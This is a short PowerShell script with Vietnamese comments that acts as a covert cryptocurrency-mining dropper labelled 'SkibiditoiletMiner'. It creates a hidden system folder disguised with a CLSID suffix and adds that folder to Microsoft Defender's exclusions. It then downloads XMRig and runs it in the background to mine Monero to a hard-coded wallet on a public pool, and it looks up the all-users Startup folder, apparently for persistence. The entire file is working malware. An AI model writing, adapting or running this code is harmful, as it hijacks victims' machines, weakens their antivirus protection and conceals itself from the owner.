$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

# tải miner cho SkibiditoiletMiner
$url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
$zipPath = "$dir\xmrig.zip"
Invoke-WebRequest -Uri $url -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $dir -Force

$miner = "$dir\xmrig-6.21.0"

# nạp donate cho SkibiditoiletMiner
& "$miner\xmrig.exe" --donate-level 1 -o de.monero.herominers.com:1111 -u "48rJxia4YFjiAZsQ7fCS2CLRBbjDQj2iL8LptnzWseJ15oyZ4By5ktC73gcTpeiUXiaqaY8FuD3Mq5Qb2eUAR8xY4KrNJtG" -p "SkibiditoiletMinerminer" -a rx/0 -k --background
